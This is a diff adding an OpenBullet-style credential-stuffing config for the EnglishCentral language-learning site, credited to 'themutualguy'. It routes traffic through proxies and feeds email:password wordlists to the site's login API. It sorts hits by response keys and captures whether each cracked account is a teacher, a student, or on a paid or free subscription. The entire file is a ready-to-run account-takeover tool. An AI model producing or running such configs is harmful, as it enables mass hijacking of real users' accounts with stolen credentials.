@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "englishcentral",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-22T23:28:42.3346427+06:00",
+  "AdditionalInfo": "",
+  "Author": "themutualguy",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.englishcentral.com/rest/identity/login" 
+  CONTENT "{\"method\":\"login\",\"email\":\"<USER>\",\"password\":\"<PASS>\",\"classID\":\"\",\"partnerID\":2,\"from\":\"/browse/videos\",\"timezone\":\"Asia/Dhaka\",\"validateOrganization\":\"\",\"nativeLanguage\":\"en\",\"referringUrl\":\"https://www.englishcentral.com/browse/videos\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "ec-site-language: en" 
+  HEADER "origin: https://www.englishcentral.com" 
+  HEADER "referer: https://www.englishcentral.com/browse/videos" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "key: \"IDENTITY_EMAILPASSWORDINCORRECT\"" 
+    KEY "Email or Password is incorrect" 
+    KEY "status: \"fail\"" 
+  KEYCHAIN Success OR 
+    KEY "\"accountID\"" 
+    KEY "status\":\"success\"" 
+
+PARSE "<SOURCE>" JSON "isTeacher" CreateEmpty=FALSE -> CAP "isTeacher" 
+
+PARSE "<SOURCE>" JSON "isStudent" CreateEmpty=FALSE -> CAP "isStudent" 
+
+REQUEST GET "https://www.englishcentral.com/api/tutor/status/account/eligibility?timeZone=Asia/Dhaka&fields=dateLimitRefresh" 
+  
+  HEADER "ec-site-language: en" 
+  HEADER "origin: https://www.englishcentral.com" 
+  HEADER "referer: https://www.englishcentral.com/browse/videos" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36" 
+
+PARSE "<SOURCE>" JSON "subscription" CreateEmpty=FALSE -> CAP "subscription" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"subscription\":\"Basic\"" 
+
+FUNCTION Constant "themutualguy" -> CAP "Config BY" 
+
